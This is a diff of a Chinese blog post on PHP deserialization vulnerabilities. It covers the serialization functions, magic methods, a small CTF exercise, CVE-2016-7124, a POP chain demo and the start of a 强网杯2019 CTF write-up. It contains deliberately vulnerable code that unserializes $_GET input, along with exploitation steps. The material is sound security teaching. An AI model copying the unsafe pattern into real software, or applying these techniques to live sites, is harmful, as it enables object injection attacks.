@@ -1,188 +1,201 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="en">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="序列化与反序列化 序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。 反序列化：将已经序列化的对象&#x2F;数组的字符串还原成对象&#x2F;数组格式。  ​     为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="PHP反序列化漏洞">
-<meta property="og:url" content="http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
-<meta property="og:site_name" content="FXXY">
-<meta property="og:description" content="序列化与反序列化 序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。 反序列化：将已经序列化的对象&#x2F;数组的字符串还原成对象&#x2F;数组格式。  ​     为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled1.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled2.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled3.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled4.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled5.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled6.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled7.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled8.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled9.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled10.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled11.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled12.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled13.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled14.png">
-<meta property="og:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled15.png">
-<meta property="article:published_time" content="2020-06-14T08:26:47.032Z">
-<meta property="article:modified_time" content="2020-06-21T01:51:48.358Z">
-<meta property="article:author" content="FXXY">
-<meta property="article:tag" content="php">
-<meta property="article:tag" content="web安全">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-        
-    
-    <!-- title -->
-    <title>PHP反序列化漏洞</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    <!-- persian styles -->
+    <meta name="author" content="FXXY">
+
+
+    <meta name="subtitle" content="FXXY">
+
+
+
+
+<title>PHP反序列化漏洞 | FXXY</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
     
-      
-<link rel="stylesheet" href="/css/rtl.css">
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
 
     
-    <!-- rss -->
     
+        
     
-      <link rel="alternate" href="/true" title="FXXY" type="application/atom+xml" />
-    
+
+
 <meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">fxxy&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
 
-<body class="max-width mx-auto px3 ltr">
     
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
-         
-          <li><a href="/links/">links</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2020/06/14/JavaScript%E5%AE%9E%E7%8E%B0web%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2020/06/14/python%E7%88%AC%E8%99%AB1.0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&text=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&is_video=false&description=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHP反序列化漏洞&body=Check out this article: http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&title=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&name=PHP反序列化漏洞&description=&lt;h2 id=&#34;序列化与反序列化&#34;&gt;&lt;a href=&#34;#序列化与反序列化&#34; class=&#34;headerlink&#34; title=&#34;序列化与反序列化&#34;&gt;&lt;/a&gt;序列化与反序列化&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。&lt;/li&gt;
-&lt;li&gt;反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;​     为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/06/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&t=PHP反序列化漏洞" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">fxxy&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/links">Links</a>
+                
+            </div>
+        </div>
+    </nav>
 
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化与反序列化"><span class="toc-number">1.</span> <span class="toc-text">序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关函数"><span class="toc-number">2.</span> <span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize："><span class="toc-number">2.1.</span> <span class="toc-text">serialize：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">2.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize："><span class="toc-number">2.2.</span> <span class="toc-text">unserialize：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#总结-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#魔法函数"><span class="toc-number">3.</span> <span class="toc-text">魔法函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct"><span class="toc-number">3.2.</span> <span class="toc-text">__destruct():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.3.</span> <span class="toc-text">__sleep():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.4.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小实践"><span class="toc-number">4.</span> <span class="toc-text">小实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#小题目"><span class="toc-number">4.1.</span> <span class="toc-text">小题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-7124"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2016-7124</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">4.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#初识POP链"><span class="toc-number">5.</span> <span class="toc-text">初识POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo-1"><span class="toc-number">5.1.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结-2"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#refer"><span class="toc-number">7.</span> <span class="toc-text">refer</span></a></li></ol>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
     </div>
-  </span>
 </div>
 
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
+
     
-    <h1 class="posttitle" itemprop="name headline">
-        PHP反序列化漏洞
-    </h1>
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP反序列化漏洞</h1>
+            
+                <div class="post-meta">
+                    
 
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-14&nbsp;&nbsp;16:26:47</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
 
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">FXXY</span>
-      </span>
-      
-
-
-    <div class="postdate">
-      
-        <time datetime="2020-06-14T08:26:47.032Z" itemprop="datePublished">2020-06-14</time>
-        
-        (Updated: <time datetime="2020-06-21T01:51:48.358Z" itemprop="dateModified">2020-06-21</time>)
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><ul>
+        <div class="post-content">
+            <h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><ul>
 <li>序列化：在PHP中，序列化用于存储或传递 PHP 的值（比如数组或者类的值）的过程中，同时不丢失其类型和结构。就是将数组和类的值转换成字符串来传递。</li>
 <li>反序列化：将已经序列化的对象/数组的字符串还原成对象/数组格式。</li>
 </ul>
 <p>​     为什么要序列化？有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</p>
-<a id="more"></a> 
-
 <h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="serialize："><a href="#serialize：" class="headerlink" title="serialize："></a>serialize：</h3><ul>
 <li>语法格式：serialize ( mixed $value )</li>
 <li>作用：返回一个字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</li>
@@ -268,7 +281,7 @@
 <li>也就是说，当代码中出现new关键字实例化一个对象时，会触发该函数</li>
 </ul>
 <h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><ul>
-<li>析构函数，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
+<li>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
 <li>也就是说，在结束创建，不再使用该对象时，会触发该函数</li>
 </ul>
 <hr>
@@ -319,8 +332,21 @@
 
 <p>输出：</p>
 <p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled8.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%208.png"></p>
+<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><ul>
+<li>当访问该类中不存在方法时，会触发此方法</li>
+</ul>
+<h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><ul>
+<li>当访问该类中不存在的属性时，会触发此方法</li>
+</ul>
+<p>看一下call和get的实践</p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">fxxy</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argu)</span></span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"don't have the function!&lt;br&gt;"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"don't have the attr"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $test = <span class="keyword">new</span> fxxy();</span><br><span class="line">   $test-&gt;hello();</span><br><span class="line">   <span class="keyword">echo</span>($test-&gt;b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200624165056534.png" alt="image-20200624165056534"></p>
 <h2 id="小实践"><a href="#小实践" class="headerlink" title="小实践"></a>小实践</h2><h3 id="小题目"><a href="#小题目" class="headerlink" title="小题目"></a>小题目</h3><p>在test.php中我们写入下面的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $name;</span><br><span class="line">        <span class="keyword">var</span> $pwd;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$pwd)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pwd = $pwd;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">"welcome"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;pwd = <span class="string">"password"</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">"wrong name and passwords"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $query = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))&#123;</span><br><span class="line">        $flag = unserialize($query);</span><br><span class="line">        $flag-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"Plz input id~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $test1 = <span class="keyword">new</span> test(<span class="string">"welcome"</span>,<span class="string">"password"</span>);</span><br><span class="line">    <span class="comment">//echo(serialize($test1));</span></span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $name;</span><br><span class="line">        <span class="keyword">var</span> $pwd;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$pwd)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pwd = $pwd;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">"welcome"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;pwd === <span class="string">"password"</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">"wrong name and passwords"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $query = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))&#123;</span><br><span class="line">        $flag = unserialize($query);</span><br><span class="line">        $flag-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"Plz input id~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $test1 = <span class="keyword">new</span> test(<span class="string">"welcome"</span>,<span class="string">"password"</span>);</span><br><span class="line">    <span class="comment">//echo(serialize($test1));</span></span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>分析：代码会对提交的id进行反序列化，当反序列化的name变量与pwd变量与代码指定的相同时，则会包含flag.php，输出flag。</p>
 <p>方法：构造test类的序列化字符串，参数值为welcome和password，然后传入id</p>
@@ -384,17 +410,117 @@
 
 <p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled15.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2015.png"></p>
 <p>这个小demo比较简单，主要涉及了两个类，实际情况中会更复杂</p>
-<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>需要明白下面几点</p>
+<h3 id="强网杯2019-upload"><a href="#强网杯2019-upload" class="headerlink" title="强网杯2019 upload"></a>强网杯2019 upload</h3><p>用一道CTF题来实际感受一下POP链。</p>
+<p>地址：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。</p>
+<p>发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.</p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153141870.png" alt="image-20200619153141870"></p>
+<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153316777.png" alt="image-20200619153316777"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:4:&quot;asdf&quot;;s:5:&quot;email&quot;;s:13:&quot;asdf@asdf.com&quot;;s:8:&quot;password&quot;;s:32:&quot;912ec803b2ce49e4a541068d495ab570&quot;;s:3:&quot;img&quot;;s:79:&quot;..&#x2F;upload&#x2F;adeee0c170ad4ffb110df0cde294aecd&#x2F;4a47a0db6e60853dedfcfdf08a5ca249.png&quot;&#125;</span><br></pre></td></tr></table></figure>
+
